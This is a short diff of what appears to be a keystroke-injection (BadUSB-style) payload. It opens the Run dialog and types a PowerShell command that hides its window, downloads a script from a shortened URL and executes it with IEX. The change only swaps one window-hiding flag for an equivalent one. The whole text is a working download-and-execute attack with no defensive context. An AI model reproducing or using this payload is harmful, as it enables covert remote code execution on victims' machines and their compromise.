@@ -2,4 +2,4 @@ Delay
 Delay
 Delay
 Press:131+114
-PrintLine:powershell -W Hidden -nop -noni -c "IEX (New-Object Net.Webclient).downloadstring('https://goo.gl/XXXXX')"
+PrintLine:powershell -w 1 -nop -noni -c "IEX (New-Object Net.Webclient).downloadstring('https://goo.gl/XXXXX')"
